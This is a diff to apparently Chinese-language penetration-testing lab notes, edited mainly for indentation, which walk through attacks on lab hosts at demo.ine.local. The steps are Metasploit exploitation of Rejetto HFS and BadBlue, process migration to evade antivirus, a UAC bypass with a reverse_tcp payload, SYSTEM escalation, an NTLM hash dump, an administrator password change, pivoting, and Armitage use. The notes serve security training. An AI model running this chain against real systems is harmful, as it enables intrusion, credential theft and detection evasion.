@@ -16,9 +16,9 @@
 		set SESSION 1
 		run
 	
-	 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
-	 --------  ---------  -----------------------  -----------  -------------  ---
-	 True      False      True                     True         1              WIN-OMCNBKR66MN\Administrator
+		 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
+		 --------  ---------  -----------------------  -----------  -------------  ---
+		 True      False      True                     True         1              WIN-OMCNBKR66MN\Administrator
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉目前和先前登入的使用者的清單以及使用者帳戶各自的SID
@@ -27,12 +27,12 @@
 		run
 
 
-	 SID                                            Profile Path
-	 ---                                            ------------
-	 S-1-5-18                                       C:\Windows\system32\config\systemprofile
-	 S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
-	 S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
-	 S-1-5-21-2563855374-3215282501-1490390052-500  C:\Users\Administrator
+		 SID                                            Profile Path
+		 ---                                            ------------
+		 S-1-5-18                                       C:\Windows\system32\config\systemprofile
+		 S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
+		 S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
+		 S-1-5-21-2563855374-3215282501-1490390052-500  C:\Users\Administrator
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	檢查目標系統是否為虛擬機: 
@@ -40,7 +40,7 @@
 		set SESSION 1
 		run
 
-	[+] This is a Xen Virtual Machine
+		[+] This is a Xen Virtual Machine
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉目標系統上已安裝的應用程式/程式的清單。
@@ -48,14 +48,14 @@
 		set SESSION 1
 		run
 
-	Installed Applications
-	======================
-
-	 Name                                Version
-	 ----                                -------
-	 AWS Tools for Windows               3.15.1084
-	 AWS Tools for Windows               3.15.1084
-	 Amazon SSM Agent                    2.3.842.0
+		Installed Applications
+		======================
+	
+		 Name                                Version
+		 ----                                -------
+		 AWS Tools for Windows               3.15.1084
+		 AWS Tools for Windows               3.15.1084
+		 Amazon SSM Agent                    2.3.842.0
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉連接到目標所在相同 LAN 的電腦清單
@@ -63,8 +63,8 @@
 		set SESSION 1
 		run
 	
-	[-] Post aborted due to failure: unknown: Could not retrieve domain name. Is the host part of a domain?
-	此模組顯示目標系統不屬於 Windows 網域
+		[-] Post aborted due to failure: unknown: Could not retrieve domain name. Is the host part of a domain?
+		此模組顯示目標系統不屬於 Windows 網域
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉股票列表
 	use post/windows/gather/enum_shares
@@ -84,53 +84,53 @@
 		use exploit/windows/http/rejetto_hfs_exec
 		set RHOSTS demo.ine.local
 		run
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > getuid
-		Server username: VICTIM\admin
-	
-	meterpreter > sysinfo
-		Computer        : VICTIM
-		OS              : Windows Server 2012 R2 (6.3 Build 9600).
-		Architecture    : x64
-		System Language : en_US
-		Domain          : WORKGROUP
-		Logged On Users : 2
-		Meterpreter     : x86/windows
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > getuid
+			Server username: VICTIM\admin
+		
+		meterpreter > sysinfo
+			Computer        : VICTIM
+			OS              : Windows Server 2012 R2 (6.3 Build 9600).
+			Architecture    : x64
+			System Language : en_US
+			Domain          : WORKGROUP
+			Logged On Users : 2
+			Meterpreter     : x86/windows
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	explorer.exe
-	逃避檢測並在受感染的系統中保持持久性
-	有助於避免被防毒軟體或可能監視可疑活動的其他安全措施所偵測到
-	
-	搜尋explorer.exe的PID
-	ps -S explorer.exe
-		2572  2564  explorer.exe  x64   1        VICTIM\admin  C:\Windows\explorer.exe
+		逃避檢測並在受感染的系統中保持持久性
+		有助於避免被防毒軟體或可能監視可疑活動的其他安全措施所偵測到
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		搜尋explorer.exe的PID
+		ps -S explorer.exe
+			2572  2564  explorer.exe  x64   1        VICTIM\admin  C:\Windows\explorer.exe
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	用migrate指令將目前進程遷移到explorer進程
-		migrate 2572
+			migrate 2572
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	shell
-	檢查管理員使用者是否是管理員群組的成員: 
-		net localgroup administrators
-		Alias name     administrators
-		Comment        Administrators have complete and unrestricted access to the computer/domain
+		檢查管理員使用者是否是管理員群組的成員: 
+			net localgroup administrators
+			Alias name     administrators
+			Comment        Administrators have complete and unrestricted access to the computer/domain
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	繞過UAC（用戶帳戶控制）來獲得高權限
-	CTRL + C
-	background
+		CTRL + C
+		background
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		運行UAC繞過記憶體注入模組
+		use exploit/windows/local/bypassuac_injection
+			set session 1
+			set TARGET 1
+			set PAYLOAD windows/x64/meterpreter/reverse_tcp
+			exploit
 
-	運行UAC繞過記憶體注入模組
-	use exploit/windows/local/bypassuac_injection
-		set session 1
-		set TARGET 1
-		set PAYLOAD windows/x64/meterpreter/reverse_tcp
-		exploit
-
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > getsystem
-	...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
-	meterpreter > getuid
-	Server username: NT AUTHORITY\SYSTEM
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > getsystem
+		...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+		meterpreter > getuid
+		Server username: NT AUTHORITY\SYSTEM
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	轉儲用戶哈希值
@@ -139,15 +139,14 @@
 		ps -S lsass.exe
 		 488  396   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\system32\lsass.exe
 		migrate 488
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > hashdump
-		admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
-		Administrator:500:aad3b435b51404eeaad3b435b51404ee:f168d9f8e6c5b893b8c4dfa202228235:::
-		Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > hashdump
+			admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
+			Administrator:500:aad3b435b51404eeaad3b435b51404ee:f168d9f8e6c5b893b8c4dfa202228235:::
+			Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 		
-	管理員 NTLM 哈希： f168d9f8e6c5b893b8c4dfa202228235
+		管理員 NTLM 哈希： f168d9f8e6c5b893b8c4dfa202228235
 ## Exploiting SMB With PsEcec
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
@@ -173,8 +172,8 @@
 		BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)  | windows/remote/16806.rb
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
-	search badblue
-	use exploit/windows/http/badblue_passthru
+		search badblue
+		use exploit/windows/http/badblue_passthru
 		set RHOSTS demo.ine.local
 		exploit
 	CTRL +z y
@@ -186,11 +185,11 @@
 	[+]     RDP Service Started
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	更改管理員密碼: 
-	sessions -i 1
-	shell
-	net user administrator hacker_123321
+		sessions -i 1
+		shell
+		net user administrator hacker_123321
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	xfreerdp /u:administrator /p:hacker_123321 /v:demo.ine.local
+	Login : xfreerdp /u:administrator /p:hacker_123321 /v:demo.ine.local
 
 ## Clearing Windows Event logs
 	nmap -sV -sC demo.ine.local
@@ -211,7 +210,7 @@
 ## Pivoting
 	ping demo2.ine.local
 	PING demo2.ine.local (10.0.31.80) 56(84) bytes of data.
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo1.ine.local
 		80/tcp    open  http               HttpFileServer httpd 2.3
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -220,13 +219,13 @@
 		use exploit/windows/http/rejetto_hfs_exec 
 		set RHOSTS demo1.ine.local
 		run
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	shell
-	ping 10.0.31.80
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > run autoroute -s 10.0.31.80/20
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		shell
+		ping 10.0.31.80
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > run autoroute -s 10.0.31.80/20
 
-	[+] Added route to 10.0.31.80/255.255.240.0 via 10.0.30.140
+		[+] Added route to 10.0.31.80/255.255.240.0 via 10.0.30.140
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	執行連接埠掃描器 (nmap)
 	background
@@ -270,20 +269,19 @@
 		Port : 55553
 		User : msf
 		Pass : armitage
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	新增目標機器的IP位址/網域名稱來開始: 
-		Host > Add Hosts > demo1.ine.local
-	Nmap 掃描: 
-		Hosts > Nmap Scan > Quick Scan (OS detect)
-	右鍵單擊系統:  
-		Scan
-	右鍵單擊系統 : 
-		Services
-	=> 查看目標系統上執行的開放連接埠和服務
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		新增目標機器的IP位址/網域名稱來開始: 
+			Host > Add Hosts > demo1.ine.local
+		Nmap 掃描: 
+			Hosts > Nmap Scan > Quick Scan (OS detect)
+		右鍵單擊系統:  
+			Scan
+		右鍵單擊系統 : 
+			Services
+		=> 查看目標系統上執行的開放連接埠和服務
 
 ## Exploitation and Post Exploitation with Armitage
-	將從上一個實驗中停止的地方繼續
-	rejetto
+	將從上一個實驗中停止的地方繼續 (rejetto)
 	exploit > windows > http > rejetto_hfs_exec > launch
 	系統窗格將更新目標系統的映像以反映成功的利用
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
